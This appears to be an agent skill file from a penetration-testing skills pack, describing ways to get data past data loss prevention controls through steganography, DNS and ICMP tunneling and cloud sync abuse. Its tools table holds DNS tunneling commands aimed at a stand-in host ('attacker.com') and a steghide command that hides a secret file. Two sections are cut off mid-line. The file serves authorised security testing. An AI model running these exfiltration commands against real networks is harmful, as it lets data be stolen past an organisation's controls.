---
name: chiper-data-loss-prevention-bypass
description: "Use when DLP bypass techniques covering steganography (LSB, audio, video), DNS tunneling, ICMP tunneling, cloud sync abuse (Dropbox, OneDrive), WebSocket/HTTP3"
version: "0.2.0"
author: Chiper (Chiper-Cyber)
metadata:
  Chiper:
    tags: [pentest, security, kali-linux, chiper-cyber, data, loss, prevention, bypass]
references:
  - path: ~/.Chiper/skills/chiper-cyber/chiper-data-loss-prevention-bypass/SKILL.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-data-loss-prevention-bypass/payloads.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-data-loss-prevention-bypass/test-cases.md
---

# Data Loss Prevention Bypass

## Prerequisites

> 💡 Missing tools? This skill will auto-check before execution.

**Required tools:**

- `garak` — install: `pip install garak`
- `steghide` — install: `sudo apt install -y steghide`

**Quick check (run before using this skill):**

```bash
# Check which tools are missing
MISSING=""
for cmd in garak steghide; do
  command -v "$cmd" >/dev/null 2>&1 || MISSING="$MISSING $cmd"
done
if [ -n "$MISSING" ]; then
  echo "⚠️  Missing tools:$MISSING"
  echo "Install with:"
  command -v garak >/dev/null 2>&1 || echo "  pip install garak"
  command -v steghide >/dev/null 2>&1 || echo "  sudo apt install -y steghide"
else
  echo "✅ All tools installed"
fi
```

## When to Use

DLP bypass techniques covering steganography (LSB, audio, video), DNS tunneling, ICMP tunneling, cloud sync abuse (Dropbox, OneDrive), WebSocket/HTTP3 exfil, AI-augmented exfil (semantic chunking), and modern DLP evasion patterns.

**Tools**: garak, PyRIT, promptfoo, custom harnesses

**Domain**: data-protection

**MITRE**: TA0010-Exfiltration, T1048-Exfiltration Over Alternative Protocol

## Core Tools

| **dnscat2** | DNS tunneling | `dnscat2 --dns domain=attacker.com` |
| **iodine** | DNS tunneling (TUN) | `iodine -f attacker.com` |
| **steghide** | LSB image steganography | `steghide embed -cf image.jpg -ef secret.txt` |
| **Coagula** | Audio steganography | Generate audio from image |
| **exift

## Methodology Overview

### Attack Chain

```
[1] Reconnaissance         [2] Channel Selection     [3] Encoding
  - DLP product identify     - DNS (port 53)            - LSB steganography
  - Whitelist apps           - HTTPS (port 443)         - Base64 + AES
  - Egress monitoring          |                        - Semantic chunking
        |                       v                          |
        v             [3.5] 

## Instructions

Read the referenced chiper-cyber files for full methodology:
- **SKILL.md** — Step-by-step methodology, attack chain, tools, and defense perspective
- **payloads.md** — Ready-to-use attack payloads organized by type and technique
- **test-cases.md** — Structured test procedures with prerequisites and expected results

Full skill content at: `~/.Chiper/skills/chiper-cyber/chiper-data-loss-prevention-bypass/`

## Examples

See `payloads.md` in the referenced directory for ready-to-use attack payloads.

## Test Cases

See `test-cases.md` in the referenced directory for structured test procedures.

## Notes

- Source: Chiper-Cyber v1.0.0 — Security Skills Ecosystem (Chiper 2026)
- Defense Triple: Defense Perspective + Detection Methods + Evasion Techniques
- Update: `cd ~/.Chiper/skills/chiper-cyber && git pull`
